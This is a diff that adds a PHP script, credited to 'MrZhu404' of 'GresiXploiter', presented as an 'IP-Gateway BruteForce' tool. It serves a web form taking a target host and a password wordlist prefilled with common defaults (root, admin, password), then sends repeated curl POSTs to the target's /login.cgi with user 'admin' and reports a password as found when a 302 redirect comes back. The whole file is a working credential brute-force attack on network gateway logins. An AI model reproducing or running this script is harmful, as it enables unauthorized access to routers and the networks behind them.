@@ -1,0 +1,123 @@
+<?php
+ 
+//Author : MrZhu404
+//Team : GresiXploiter
+//Since 2019
+//Recode Fikss Luh Kontl_-
+ 
+set_time_limit(0);
+error_reporting(0);
+ 
+class MrZhu{
+ 
+        private $host;
+        private $user;
+        private $open;
+        private $passwordnya;
+ 
+  public function banner() {
+   echo("
+    <html>
+    <head>
+    <title>IP-Gateway Brute</title>
+    <link href=\"https://fonts.googleapis.com/css?family=Oxanium|Trade+Winds|Graduate|Joti+One|Rajdhani|Viaoda+Libre&display=swap\" rel=\"stylesheet\">
+    <meta name=\"viewport\" content=\"width=1000, user-scalable=no\">
+    <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\">
+    <meta name=\"theme-color\" content=\"red\">
+    <script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
+    <style type='text/css'>
+body{
+  background-color:white;
+}
+</style>
+</head>
+<body><center><br>
+<div class=\"container\">
+  <div class=\"card\" style=\"width: 750px; \">
+    <div class=\"card-header bg-primary text-white\">IP-Gateway BruteForce by MrZhu404</div>
+    <div class=\"card-body\">
+      <form action=\"\" method=\"post\">
+        <div class=\"form-group\">
+          <label for=\"username\">Masukan IP/Host</label>
+          <input type='text' name='host' placeholder='192.168.1.1' class=\"form-control\" >
+        </div>
+        <div class=\"form-group\">
+          <label for=\"password\">Masukan Wordlist</label>
+          <textarea name='passwordnya' class='form-control' style='resize:none; height:350px;'>
+root
+theworldinyourhand
+support
+password
+default
+admin</textarea><br><br><center><br>
+<center><br></center>
+        </div>
+        <input type='Submit' class='btn btn-primary' value='KLIK ME'><font color=\"white\">
+      </form>
+    </div>
+    <div class=\"card-header bg-primary text-white\">Copyright &copy; 2k19 GresiXploiter</div>
+  </div>
+
+</div>
+<hr>
+<form action='' method='POST'>
+</form>
+</body></center><center><font color='grey'>
+</html>");
+}
+ 
+    public function extract_post() {
+         $this->host = $_POST["host"];
+         $this->user = $_POST["user"];
+         $this->open = $_POST["passwordnya"];
+       }
+ 
+       public function Xregex() {
+         if(preg_match("@/login.cgi@", $this->host)) {
+             return true;
+         } else {
+            $this->host = $_POST["host"]."/login.cgi";
+         }
+     }
+ 
+      public function brute() {
+           $passwordnya = array_filter(explode("\n", $this->open));
+           foreach($passwordnya as $this->passwordnya) {
+           for($i=0; $i < count($this->passwordnya); $i++) {
+                        $this->Xcurl();
+                     }
+              }
+       }
+ 
+        private function cool() {
+            echo "<font color='#007bff' style='font-size: 15px;'> Url : "."<font color='grey'>{$this->host}</font>";
+            echo "<font color='#007bff' style='font-size: 15px;'> Pass : "."<font color='grey'>{$this->passwordnya}</font>";
+        }
+ 
+        private function Xcurl() {
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $this->host);
+            curl_setopt($curl, CURLOPT_USERAGENT, $this->useragent);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
+            curl_setopt($curl, CURLOPT_POST, true);
+            curl_setopt($curl, CURLOPT_POSTFIELDS, "name=admin&pswd=$this->passwordnya");
+            $exec = curl_exec($curl);
+            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+            $this->cool();
+            if($http == 302) {
+                 echo "<script>swal('OK', 'Passwordnya adalah {$this->passwordnya}', 'success')</script><br><br><hr><font color='#007bff' style='font-size: 15px;'>[<font color='grey'>+</font>] <font color='grey'>Password ketemu : <font color='#007bff'>{$this->passwordnya} <font color='#007bff'>[<font color='grey'>+<font color='#007bff'>]</font></div><br>";
+            } else {
+                echo "<font color='red'>[-] Gagal [-]</font><br>";
+            }
+                curl_close($curl);
+        }
+}
+ 
+$wp = new MrZhu();
+$wp->useragent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10";
+$wp->banner();
+$wp->extract_post();
+$wp->Xregex();
+$wp->brute();
+?>
